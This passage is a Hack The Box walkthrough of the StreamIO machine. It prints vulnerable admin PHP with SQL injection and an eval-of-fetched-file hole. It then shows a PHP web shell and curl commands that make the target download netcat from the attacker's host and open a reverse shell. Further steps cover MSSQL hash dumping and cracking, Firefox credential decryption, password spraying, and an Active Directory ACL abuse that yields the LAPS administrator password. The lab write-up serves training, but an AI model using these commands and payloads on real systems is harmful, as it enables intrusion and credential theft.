$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>%
```


While scrolling through the source code, I noticed several questionable coding practices:

```php
$query = "delete from movies where id = ".$_POST['movie_id'];
```

and

```php
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
```

Directly concatenating user input into SQL queries is never a great sign. But those weren't the most interesting lines. The real treasure was buried all the way at the bottom of the file.

```php
if(isset($_POST['include']))
{
    if($_POST['include'] !== "index.php")
        eval(file_get_contents($_POST['include']));
    else
        echo(" ---- ERROR ---- ");
}
```

Someone combined `file_get_contents()` and `eval()` on user-controlled input.


## ⚡ Exploitation (Initial Access)

#### From LFI to Code Execution

The application accepts a POST parameter named `include`.

It then performs two dangerous actions:

1. Reads the contents of whatever file is supplied.
2. Passes those contents directly into `eval()`.

In other words:

```php
eval(file_get_contents($_POST['include']));
```

If I can control the file being loaded, I control the code being executed.

At that point this isn't merely an LFI but a Remote Code Execution vulnerability.

#### Building a Simple Payload

To test the theory, I created a tiny PHP file on my attack machine and saved it as `lol.php.

```php
system($_GET['cmd']);
```


Then I hosted it with a simple Python web server. Now all I needed to do is convince StreamIO to download and execute it.

#### Confirming RCE

Using the vulnerable `include` parameter, I instructed the application to fetch my hosted PHP file.

At the same time, I supplied a command through the URL.

```http
curl -X POST 'https://streamio.htb/admin/?debug=master.php&cmd=dir' -k -b 'PHPSESSID=ueoq44hqu1pvilao80rnhdv0c1' -d 'include=http://10.10.14.239/lol.php
```

It works so now I'm going to upload a netcat binary to get a proper remote shell.

Here's what happens behind the scenes:

1. The application downloads `lol.php`.
2. `file_get_contents()` reads the file.
3. `eval()` executes the PHP code.
4. The PHP code runs `system($_GET['cmd']);`
5. The supplied command (`dir`) executes on the target server.

And just like that, I have command execution.

#### Upgrading to a Shell

Executing individual commands is useful, but I need a proper interactive shell.

To accomplish this, I first downloaded a copy of Netcat onto the target.

```shell
curl -X POST 'https://streamio.htb/admin/?debug=master.php&cmd=curl+10.10.14.239/nc.exe+-o+C:\Windows\Temp\nc.exe' -k -b 'PHPSESSID=ueoq44hqu1pvilao80rnhdv0c1' -d 'include=http://10.10.14.239/lol.php'
```

Once the binary is in place, I used it to create a reverse shell back to my attacker machine.

```
curl -X POST 'https://streamio.htb/admin/?debug=master.php&cmd=C:\Windows\Temp\nc.exe+10.10.14.239+9001+-e+cmd.exe' -k -b 'PHPSESSID=ueoq44hqu1pvilao80rnhdv0c1' -d 'include=http://10.10.14.239/lol.php'
```


On my listener, a connection immediately appeared.
![LFI to RCE](/images/streamio/LFItoRCE.png)

Now I have a shell!!



---



```shell
(Meterpreter 1)(c:\ProgramData) > upload winPEAS.exe
[*] Uploading  : /home/split/Documents/HTB/StreamIO/www/winPEAS.exe -> winPEAS.exe
[*] Uploaded 8.00 MiB of 11.06 MiB (72.31%): /home/split/Documents/HTB/StreamIO/www/winPEAS.exe -> winPEAS.exe
[*] Uploaded 11.06 MiB of 11.06 MiB (100.0%): /home/split/Documents/HTB/StreamIO/www/winPEAS.exe -> winPEAS.exe
[*] Completed  : /home/split/Documents/HTB/StreamIO/www/winPEAS.exe -> winPEAS.exe
(Meterpreter 1)(c:\ProgramData) > shell
Process 4572 created.
Channel 6 created.
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.
```


```shell
evil-winrm -i dc.streamio.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com' 
```

## 🛡️ Privilege Escalation

### Local Enumeration 

```shell
(Meterpreter 2)(c:\inetpub\streamio.htb) > dir
Listing: c:\inetpub\streamio.htb
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  4341  fil   2022-02-23 04:16:36 -0600  about.php
100666/rw-rw-rw-  1357  fil   2022-02-23 04:16:36 -0600  about_include.php
040777/rwxrwxrwx  4096  dir   2022-02-22 04:49:58 -0600  admin
100666/rw-rw-rw-  2908  fil   2022-02-23 04:16:36 -0600  contact.php
100666/rw-rw-rw-  1706  fil   2022-02-23 04:16:36 -0600  contact_include.php
040777/rwxrwxrwx  4096  dir   2022-02-22 04:49:58 -0600  css
100666/rw-rw-rw-  1150  fil   2021-07-30 03:57:16 -0500  favicon.ico
040777/rwxrwxrwx  4096  dir   2022-02-22 04:49:58 -0600  fonts
100666/rw-rw-rw-  1812  fil   2022-02-22 05:21:18 -0600  header_include.php
040777/rwxrwxrwx  4096  dir   2022-02-22 04:49:59 -0600  images
100666/rw-rw-rw-  7337  fil   2022-02-26 01:57:05 -0600  index.php
100666/rw-rw-rw-  2415  fil   2022-02-23 04:16:36 -0600  info_include.php
040777/rwxrwxrwx  4096  dir   2022-02-22 05:19:08 -0600  js
100666/rw-rw-rw-  3938  fil   2022-02-26 10:27:28 -0600  login.php
100666/rw-rw-rw-  216   fil   2022-02-23 04:16:36 -0600  logout.php
100666/rw-rw-rw-  4480  fil   2022-02-26 01:42:13 -0600  register.php
```

```php
(Meterpreter 2)(c:\inetpub\streamio.htb) > cat login.php
<?php
$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
$handle = sqlsrv_connect('(local)',$connection);
function bad_char_check($name)
```

```shell
(Meterpreter 2)(c:\inetpub\streamio.htb\admin) > cat index.php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
        header('HTTP/1.1 403 Forbidden');
        die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
```

I noticed from the winPEAS scan port 1433 is open and I have database credentials.

```shell
c:\ProgramData> netstat -ano
 netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3680
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       3040
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       508
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1184
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1648
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49677          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49682          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49704          0.0.0.0:0              LISTENING       3000
  TCP    0.0.0.0:49729          0.0.0.0:0              LISTENING       3032
  TCP    10.129.14.113:53       0.0.0.0:0              LISTENING       3000
```

need to connect to mssql by performing port forwarding.

my machine
```shell
┌─[split@parrot:~/Documents/HTB/StreamIO/www]
└─❯ chisel server --reverse -p 8000                                           ──(Wed,Jun17)─┘
2026/06/17 15:50:48 server: Reverse tunnelling enabled
2026/06/17 15:50:48 server: Fingerprint pt0xqN/Cr3++MWopzCHNopRctUwhYrFH4Mdfsetk0Yk=
2026/06/17 15:50:48 server: Listening on http://0.0.0.0:8000
2026/06/17 15:52:59 server: session#1: tun: proxy#R:1433=>1433: Listening
```


on Target
```shell
c:\programdata>.\chisel.exe client 10.10.14.239:8000 R:1433:127.0.0.1:1433
.\chisel.exe client 10.10.14.239:8000 R:1433:127.0.0.1:1433
2026/06/17 20:52:58 client: Connecting to ws://10.10.14.239:8000
2026/06/17 20:52:59 client: Connected (Latency 62.9048ms)
```


```shell
┌─[split@parrot:~/Documents/HTB/StreamIO/www]
└─❯ mssqlclient.py db_admin@127.0.0.1 -p 1433                                 ──(Wed,Jun17)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC): Line 1: Changed database context to 'master'.
[*] INFO(DC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands

SQL (db_admin  db_admin@master)> select user_name();

--------
db_admin
SQL (db_admin  db_admin@master)> SELECT name FROM master.dbo.sysdatabases;
name
---------------
master
tempdb
model
msdb
STREAMIO
streamio_backup

SQL (db_admin  db_admin@master)> use STREAMIO
ENVCHANGE(DATABASE): Old Value: master, New Value: STREAMIO
INFO(DC): Line 1: Changed database context to 'STREAMIO'.

SQL (db_admin  db_admin@STREAMIO)> SELECT * FROM STREAMIO.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
-------------   ------------   ----------   ----------
STREAMIO        dbo            movies       b'BASE TABLE'
STREAMIO        dbo            users        b'BASE TABLE'

SQL (db_admin  db_admin@STREAMIO)> SELECT * FROM users;
id   username                                             password                                             is_staff
--   --------------------------------------------------   --------------------------------------------------   --------
 3   James                                                c660060492d9edcaa8332d89c99c9239                            1
 4   Theodore                                             925e5408ecb67aea449373d668b7359e                            1
 5   Samantha                                             083ffae904143c4796e464dac33c1f7d                            1
 6   Lauren                                               08344b85b329d7efd611b7a7743e8a09                            1
 7   William                                              d62be0dc82071bccc1322d64ec5b6c51                            1
 8   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5                            1
 9   Robert                                               f03b910e2bd0313a23fdd7575f34a694                            1
10   Thane                                                3577c47eb1e12c8ba021611e1280753c                            1
11   Carmon                                               35394484d89fcfdb3c5e447fe749d213                            1
12   Barry                                                54c88b2dbd7b1a84012fabc1a4c73415                            1
13   Oliver                                               fd78db29173a5cf701bd69027cb9bf6b                            1
14   Michelle                                             b83439b16f844bd6ffe35c02fe21b3c0                            1
15   Gloria                                               0cfaaaafb559f081df2befbe66686de0                            1
16   Victoria                                             b22abb47a02b52d5dfa27fb0b534f693                            1
17   Alexendra                                            1c2b3d8270321140e5153f6637d3ee53                            1
18   Baxter                                               22ee218331afd081b0dcd8115284bae3                            1
19   Clara                                                ef8f3d30a856cf166fb8215aca93e9ff                            1
20   Barbra                                               3961548825e3e21df5646cafe11c6c76                            1
21   Lenord                                               ee0b8a0937abd60c2882eacb2f8dc49f                            1
22   Austin                                               0049ac57646627b8d7aeaccf8b6a936f                            1
23   Garfield                                             8097cedd612cc37c29db152b6e9edbd3                            1
24   Juliette                                             6dcd87740abb64edfa36d170f0d5450d                            1
25   Victor                                               bf55e15b119860a6e6b5a164377da719                            1
26   Lucifer                                              7df45a9e3de3863807c026ba48e55fb3                            1
27   Bruno                                                2a4e2cf22dd8fcb45adcb91be1e22ae8                            1
28   Diablo                                               ec33265e5fc8c2f1b0c137bb7b3632b5                            1
29   Robin                                                dc332fb5576e9631c9dae83f194f8e70                            1
30   Stan                                                 384463526d288edcc95fc3701e523bc7                            1
31   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332                            1
33   admin                                                665a50ac9eaa781e4f7f04199db97a11                            0
SQL (db_admin  db_admin@STREAMIO)>


```

I already had this database.


```shell
SQL (db_admin  db_admin@STREAMIO)> use streamio_backup
ENVCHANGE(DATABASE): Old Value: STREAMIO, New Value: streamio_backup
INFO(DC): Line 1: Changed database context to 'streamio_backup'.
SQL (db_admin  db_admin@streamio_backup)> SELECT * FROM streamio_backup.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG     TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
---------------   ------------   ----------   ----------
streamio_backup   dbo            movies       b'BASE TABLE'
streamio_backup   dbo            users        b'BASE TABLE'
SQL (db_admin  db_admin@streamio_backup)> SELECT * FROM users;
id   username                                             password
--   --------------------------------------------------   --------------------------------------------------
 1   nikk37                                               389d14cb8e4e9b94b137deb1caf0612a
 2   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332
 3   James                                                c660060492d9edcaa8332d89c99c9239
 4   Theodore                                             925e5408ecb67aea449373d668b7359e
 5   Samantha                                             083ffae904143c4796e464dac33c1f7d
 6   Lauren                                               08344b85b329d7efd611b7a7743e8a09
 7   William                                              d62be0dc82071bccc1322d64ec5b6c51
 8   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5
SQL (db_admin  db_admin@streamio_backup)>
```

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes2 --format=Raw-MD5                                                                                            ──(Wed,Jun17)─┘
[sudo] password for split:
Using default input encoding: UTF-8
Loaded 8 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 5 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
get_dem_girls2@yahoo.com (?)
1g 0:00:00:00 DONE (2026-06-17 16:16) 1.754g/s 25163Kp/s 25163Kc/s 114520KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

`nikk37:get_dem_girls2@yahoo.com`

From bloodhound data Nikk37 is part of the `Remote Management Users` group and has PSRemote Privileges.

I can use evil-winrm or PSRemoting.

Now have user flag.

At this point I used SharpHound ingester to gather some data for bloodhound. I always like to look at the permissions of users that have directories on my computer.

```shell
*Evil-WinRM* PS C:\Users\nikk37\desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd
krbtgt                   Martin                   nikk37
yoshihide
The command completed with one or more errors.
```

Martin is an admin but I don't have a way of getting to him yet. 

JDgodd is also interesting.


![JDGodd](/images/streamio/JDGodd.png)

This user has the `WriteOwner` privilege over the group `Core Staff`.


![Core Staff](/images/streamio/CoreStaff.png)

`Core Staff` has ReadLAPSPassword rights.

### Lateral Movement (If Required)

I'm sort of stuck for the moment and when that happens its time to do some password spraying. I have a lot of new passwords and credentials which I have added to my lists.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ nxc smb streamio.htb -u users -p passwords                                                                                                                                ──(Wed,Jun17)─┘
SMB         10.129.14.113   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.14.113   445    DC               [-] streamIO.htb\James:highschoolmusical STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\Theodore:highschoolmusical STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\Samantha:highschoolmusical STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\Lauren:highschoolmusical STATUS_LOGON_FAILURE
```

No luck, back the the drawing board.

I ran winPEAS again and saw this.

```shell
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information (T1217,T1539,T1555.003) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history

    [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).
```


There's a tool used just fot this purpose but unfortunately it did not work for me. Not sure why since it seemed to work for other people.

```shell
*Evil-WinRM* PS C:\programdata> .\LaZagne.exe browsers -v

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: nikk37 ##########

 ------------------- Ie passwords -----------------

[!] No passwords found


[+] 0 passwords have been found.

elapsed time = 0.0
```


So I need two files 
- key4.db
- logins.json

I had to use this tool instead.

```shell
(fire) ┌─[split@parrot:~/Tools/firepwd]
└─❯ python3 firepwd.py                                                                                                                                                        ──(Wed,Jun17)─┘
<SNIP>
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

I started password spraying with these new passwords and got a hit.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ nxc smb streamio.htb -u jdgodd -p passwords                                                                                                                               ──(Wed,Jun17)─┘
SMB         10.129.14.113   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:highschoolmusical STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:physics69i STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:paddpadd STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:%$clara STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:$monique$1991$ STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:$hadoW STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:$3xybitch STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:##123a8j8w5123## STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:!?Love?!123 STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:!5psycho8! STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:!!sabrina$ STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [-] streamIO.htb\jdgodd:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
SMB         10.129.14.113   445    DC               [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r
```

### Root Path

Earlier, BloodHound showed that the **`jdgodd`** account has the **`WriteOwner`** permission over the **Core Staff** group.

By itself, **WriteOwner** isn't enough to add users to the group. What it does allow is changing the owner of the Active Directory object. Once you own an object in Active Directory, you can change its permission even if you couldn't before.

That means I can take ownership of the **Core Staff** group, give **jdgodd** **FullControl**, and then use those new permissions to add myself as a member.

To do that, I use **Impacket's `dacledit.py`** to modify the group's ACL and grant **jdgodd** **FullControl** over the **Core Staff** group.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ dacledit.py -principal jdgodd -target 'Core Staff' -action write -rights FullControl streamio.htb/jdgodd:'JDg0dd1s@d0p3cr3@t0r' -dc-ip 10.129.21.10
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260628-171238.bak
[*] DACL modified successfully!
```

With FullControl over the group, I can now add `JDGodd` as a member using **bloodyAD**.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ bloodyAD --host 10.129.21.10 -d streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember 'core staff' jdgodd
[+] jdgodd added to core staff
```

A quick check from my WinRM session confirms that my account is now a member of the **Core Staff** group.

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> net group 'Core Staff'
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
JDgodd
The command completed successfully.
```


The **Core Staff** group has permission to read **LAPS** passwords.

**Microsoft Local Administrator Password Solution (LAPS)** stores the local Administrator password for domain-joined machines in Active Directory. Only authorized users or groups can read those passwords. Since I've promoted myself into **Core Staff**, I can now retrieve the password for the Domain Controller's local Administrator account.

I initially used **NetExec**.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ nxc smb streamio.htb -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps jdgodd    ──(Sun,Jun28)─┘
SMB         10.129.21.10    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.21.10    445    DC               [-] DC\jdgodd:XBx[4L{H4n0z58 STATUS_LOGON_FAILURE
```

Unfortunately, instead of simply printing the password, it tried authenticating with it and returned a `STATUS_LOGON_FAILURE`. The password was actually sitting right there in the output, but NetExec wasn't kind enough to label it.

To avoid any guesswork, I switched to **`laps.py`**, which cleanly dumps the LAPS password.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ python3 laps.py -u jdgodd -p JDg0dd1s@d0p3cr3@t0r -l 10.129.21.10 -d streamio.htb
LAPS Dumper - Running at 06-28-2026 17:18:38
DC XBx[4L{H4n0z58
```

Now that I have the local Administrator password for the Domain Controller, all that's left is to authenticate over WinRM.

```shell
┌─[split@parrot:~/Documents/HTB/StreamIO]
└─❯ evil-winrm -i streamio.htb -u 'administrator' -p 'XBx[4L{H4n0z58'  
```

Overall, I learned a lot from this box although it was very challenging. It felt like I was hunting a needle in a haystack most of the time. Just to make it a bit more frustrating the creator decided to not put the flag the root flag in it's normal spot. It's located in Martin's Desktop folder.

The End